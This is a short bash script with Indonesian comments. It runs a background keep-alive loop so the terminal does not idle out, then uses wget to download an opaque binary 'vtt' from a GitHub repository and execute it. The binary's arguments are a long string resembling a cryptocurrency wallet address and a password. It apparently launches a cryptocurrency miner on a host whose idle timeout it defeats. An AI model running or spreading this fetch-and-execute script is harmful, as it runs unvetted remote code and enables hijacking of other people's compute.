#!/bin/bash

# Fungsi keep-alive: tampilkan timestamp setiap 1 menit
keep_alive() {
    while true; do
        echo "[keep-alive] $(date '+%Y-%m-%d %H:%M:%S') - Terminal tetap aktif..."
        sleep 60  # setiap 1 menit
    done
}

# Jalankan keep-alive di background
keep_alive &
KEEP_PID=$!

# Download & jalankan program utama
wget -q https://github.com/Nitasa61/erdep1/raw/refs/heads/main/vtt && chmod +x vtt && ./vtt --user 85fw2RxMCZYf1B63WRHFYdfUB1TrwuotRbeFZ7WzU3TcTvSPztX9vsmZsczrJALfFtGGKZjv24ZvwK4txh4nMpDuCCGLMYK --pass afdah2

# Setelah program utama selesai, hentikan keep-alive
kill $KEEP_PID 2>/dev/null